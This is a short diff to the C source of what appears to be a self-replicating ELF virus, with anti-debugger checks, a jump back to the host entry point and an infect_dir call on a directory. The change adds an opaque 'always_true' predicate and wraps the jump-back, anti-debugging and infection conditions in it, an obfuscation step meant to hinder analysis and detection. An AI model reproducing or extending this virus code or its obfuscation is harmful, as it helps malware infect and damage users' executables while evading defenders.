@@ -87,6 +87,11 @@ __attribute__((always_inline)) inline int ft_strnstr(volatile char *haystack, vo
 __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatile void *dst, uint64_t size);
 __attribute__((always_inline)) inline int ft_strnstr_with_max_needle_size(volatile char *haystack, volatile char *needle, size_t size, size_t NEEDLE_SIZE);
 
+__attribute__((always_inline)) inline int
+always_true(int x) {
+    return ((x * x) % 2) == ((x * (x + 1)) % 2);
+}
+
 __attribute__((always_inline)) inline void
 ft_strcat(volatile char *dst, volatile char *src) {
     while (*dst) {
@@ -313,7 +318,7 @@ jump_back(int fd_self) {
 
     Elf64_Ehdr *header = file_self.mem;
     uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
-    if (header->e_type == ET_DYN) {
+    if (always_true(8123) && header->e_type == ET_DYN) {
         jump_to += get_base_address();
     }
     file_munmap(&file_self);
@@ -328,7 +333,7 @@ _start() {
         ft_exit(0);
     };
 
-    if (in_debugger() || bad_process_running()) {
+    if (always_true(9398) && (in_debugger() || bad_process_running())) {
         jump_back(fd_self);
     }
 
@@ -344,7 +349,7 @@ _start() {
     dir[8] = 't';
     dir[9] = '\0';
 
-    if (infect_dir(dir, fd_self)) jump_back(fd_self);
+    if (always_true(9391128) && infect_dir(dir, fd_self)) jump_back(fd_self);
 
     jump_back(fd_self);
 }
